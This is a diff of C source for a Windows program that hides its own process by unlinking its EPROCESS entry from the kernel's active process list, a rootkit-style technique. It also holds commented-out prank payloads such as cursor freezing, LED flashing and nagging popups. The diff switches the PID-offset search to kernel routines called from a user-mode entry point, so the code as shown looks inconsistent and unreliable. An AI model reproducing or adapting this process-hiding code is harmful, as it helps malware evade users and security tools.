@@ -23,11 +23,11 @@ VOID CALLBACK WaitOrTimerCallback(
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
 
 	int argc;
-	
+
 	popup("Process Started..", "Hi");
 	hidep();
 
-	
+
 	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
 
 	//if (argc == 1 || lstrcmpW(argv[1], ARG)) {
@@ -54,16 +54,16 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 
 	//while (popup("lol", "Still using this computer?\n") == IDYES) {}
 	//HANDLE lightsT = CreateThread(NULL, NULL, &FlashLEDs, NULL, 0, NULL);
-	
+
 
 	//createNote(".\\note.txt", "WOowoowowooOOWoWOo", TRUE);
-	
+
 
 	//makeSearch("https://www.youtube.com/watch?v=T5y_OcKDadQ");
 
 	//freezeCursor(15);
 
-	
+
 
 	while (true) Sleep(10000);
 	return 0;
@@ -105,17 +105,16 @@ void monitor() {
 
 void hidep() {
 
-	
+
 
 	ULONG PID_OFFSET = find_eproc_pid();
-	
+
 	ULONG LIST_OFFSET = PID_OFFSET;
 
 	LIST_OFFSET += sizeof(INT_PTR);
 
-	// I hate Microsoft 
-	PsGetCurrentProcess GetPEproc = (PsGetCurrentProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "PsGetCurrentProcess");
-	LPVOID currentProcess = GetPEproc();
+
+	LPVOID currentProcess = PsGetCurrentProcess();
 
 	PLIST_ENTRY current = (PLIST_ENTRY)((ULONG_PTR)currentProcess + LIST_OFFSET);
 	PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)currentProcess + PID_OFFSET);
@@ -128,57 +127,41 @@ void hidep() {
 
 	prev->Flink = next;
 	next->Blink = prev;
-	
+
 	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
 	current->Blink = (PLIST_ENTRY)&current->Flink;
 	current->Flink = (PLIST_ENTRY)&current->Flink;
 }
 
+static const UINT8 proc_amount = 3;
+
 ULONG find_eproc_pid() {
 
-	ULONG offset = 0;
-	int index = 0;
+	ULONG pid_ofs = 0; // The offset we're looking for
+	int idx = 0;                // Index 
+	ULONG pids[proc_amount];				// List of PIDs for our 3 processes
+	PEPROCESS eprocs[proc_amount];		// Process list, will contain 3 processes
 
-	char text[100];
-	int returnLength;
-	
-	HMODULE hNtDll = LoadLibraryA("ntdll.dll");
-	
-	// Cannot ever get access to kernel functions :(
-	if (!GetModuleHandleA("ntoskrnl.exe")) {
-		popup("Bad", "Very bad");
-		sprintf_s(text, "%d", GetLastError());
-		popup("Interesting", text);
-		popup("Wtf", "huih");
-
-	}
-	else {
-		popup("Good!", "Nice");
-	}
-	
-	
-	// I hate Microsoft 
-	LPVOID PEProc = (PsGetCurrentProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "IoGetCurrentProcess");
-
-
-	//sprintf_s(text, "%d", GetLastError());
-	//popup(text, text);
-
-
-	popup("hkt", "fjd");
-	for (unsigned int i = 0x20; i < 0x300; i += 4) {
-
-		
-		Sleep(5000);
-		if (*(ULONG*)((UCHAR*)PEProc + i) == GetCurrentProcessId()) {
-			
-			offset = i; break;
+	//Select 3 process PIDs and get their EPROCESS Pointer
+	for (int i = 16; idx < proc_amount; i += 4) {
+		if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)i, &eprocs[idx]))) {
+			pids[idx++] = i;
 		}
 	}
 
-	/*char buff[100];
-	sprintf_s(buff, "%ld", offset);
-	popup(buff, buff);*/
-	
-	return offset;
+	for (int i = 0x20; i < 0x300; i += 4) {
+		if ((*(ULONG*)((UCHAR*)eprocs[0] + i) == pids[0])
+			&& (*(ULONG*)((UCHAR*)eprocs[1] + i) == pids[1])
+			&& (*(ULONG*)((UCHAR*)eprocs[2] + i) == pids[2]))
+		{
+			pid_ofs = i; break;
+		}
+	}
+
+	ObDereferenceObject(eprocs[0]);
+	ObDereferenceObject(eprocs[1]);
+	ObDereferenceObject(eprocs[2]);
+
+
+	return pid_ofs;
 }
